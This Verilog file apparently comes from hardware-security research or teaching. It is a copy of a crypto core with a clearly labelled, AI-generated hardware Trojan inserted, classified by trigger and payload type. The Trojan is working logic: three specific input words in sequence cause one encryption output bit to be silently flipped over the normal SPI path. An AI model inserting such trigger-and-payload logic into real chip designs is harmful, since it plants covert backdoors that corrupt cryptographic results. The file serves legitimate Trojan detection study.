// AI-generated hardware Trojan, inserted into the clean refactor.
// =====================================================================
// This file is identical to rtl/crypto_core_clean.v EXCEPT for the clearly
// marked `TROJAN` logic. Diff the two files to see the entire modification.
//
// TAXONOMY (per Trust-Hub / Tehranipoor-Koushanfar style classification):
//   * Insertion phase : design-time RTL insertion (added to source RTL).
//   * Trigger class   : digital, input-controlled, SEQUENTIAL. A rare,
//                       ordered sequence of three COMPLETE input transactions
//                       (SEQ0 -> SEQ1 -> SEQ2) arms and fires the payload.
//   * Trigger rarity  : requires 3 exact 32-bit words in order; any wrong
//                       completed transaction resets progress (except a word
//                       equal to SEQ0, which restarts the sequence).
//   * Payload class   : functional corruption, INTEGRITY impact. A single
//                       output bit (bit 0) is inverted on exactly one result.
//   * Delivery channel: the EXISTING SPI output path (no added ports/pins).
//   * Effect scope    : ONE result. After firing, progress resets and
//                       ordinary operation resumes immediately.
//   * Reset behavior  : synchronous RST_N clears trigger progress (dis-arms).
//
// "A completed transaction" = a START-launched 4-round transform whose result
// reaches the load stage (pc==5). The word evaluated is the input that was
// captured for that transaction.
module crypto_core_trojan (
    input  wire SCK, RST_N, MOSI, NORM_CS_N, START, ENC_DEC,
    output wire MISO, BUSY, ICE_LED
);
    localparam [31:0] K = 32'h8E043CB1;

    // ---- TROJAN parameters ----
    localparam [31:0] SEQ0 = 32'h13375EED;   // 1st armed word ("leet seed")
    localparam [31:0] SEQ1 = 32'hC0DEFACE;   // 2nd armed word
    localparam [31:0] SEQ2 = 32'hA5A5A5A5;   // 3rd word: fires payload
    localparam [31:0] PAYLOAD_MASK = 32'h00000001;  // invert output bit 0
    // ---------------------------

    reg [7:0] SB  [0:255];
    reg [7:0] ISB [0:255];
    initial begin
        $readmemh("rtl/sbox.hex",     SB);
        $readmemh("rtl/inv_sbox.hex", ISB);
    end

    function [31:0] sub_bytes(input [31:0] x);
        sub_bytes = {SB[x[31:24]], SB[x[23:16]], SB[x[15:8]], SB[x[7:0]]};
    endfunction
    function [31:0] inv_sub_bytes(input [31:0] x);
        inv_sub_bytes = {ISB[x[31:24]], ISB[x[23:16]], ISB[x[15:8]], ISB[x[7:0]]};
    endfunction
    function [31:0] rotl8(input [31:0] a); rotl8 = {a[23:0], a[31:24]}; endfunction
    function [31:0] rotr8(input [31:0] a); rotr8 = {a[7:0],  a[31:8]};  endfunction
    function [31:0] one_round(input [31:0] v, input md);
        if (md == 1'b0) one_round = rotl8(sub_bytes(v ^ K));
        else            one_round = inv_sub_bytes(rotr8(v)) ^ K;
    endfunction

    reg [31:0] shreg, work;
    reg        miso_r, md;
    reg [2:0]  pc;
    reg [31:0] in_word;      // TROJAN: input captured for this transaction
    reg [1:0]  tp;           // TROJAN: trigger progress (0..2 words matched)

    always @(posedge SCK) begin
        if (!RST_N) begin
            shreg  <= 32'b0; work <= 32'b0; miso_r <= 1'b0;
            pc <= 3'd0; md <= 1'b0;
            tp <= 2'd0;                      // TROJAN: reset dis-arms
        end else if (!NORM_CS_N) begin
            miso_r <= shreg[31];
            shreg  <= {shreg[30:0], MOSI};
        end else begin
            case (pc)
                3'd0: if (START) begin
                          work <= shreg; md <= ENC_DEC;
                          in_word <= shreg;       // TROJAN: remember the input
                          pc <= 3'd1;
                      end
                3'd1: begin work <= one_round(work, md); pc <= 3'd2; end
                3'd2: begin work <= one_round(work, md); pc <= 3'd3; end
                3'd3: begin work <= one_round(work, md); pc <= 3'd4; end
                3'd4: begin work <= one_round(work, md); pc <= 3'd5; end
                3'd5: begin
                          // ===== TROJAN trigger evaluation + payload =====
                          if (tp == 2'd2 && in_word == SEQ2) begin
                              shreg <= work ^ PAYLOAD_MASK;  // FIRE: corrupt 1 result
                              tp    <= 2'd0;                 // one-shot, resume normal
                          end else begin
                              shreg <= work;                 // normal result
                              if      (tp == 2'd0 && in_word == SEQ0) tp <= 2'd1;
                              else if (tp == 2'd1 && in_word == SEQ1) tp <= 2'd2;
                              else if (in_word == SEQ0)               tp <= 2'd1; // restart
                              else                                    tp <= 2'd0; // near-miss
                          end
                          // ===============================================
                          pc <= 3'd0;
                      end
                default: pc <= 3'd0;
            endcase
        end
    end

    assign MISO    = miso_r;
    assign BUSY    = START | (pc >= 3'd1 && pc <= 3'd3);
    assign ICE_LED = BUSY;
endmodule
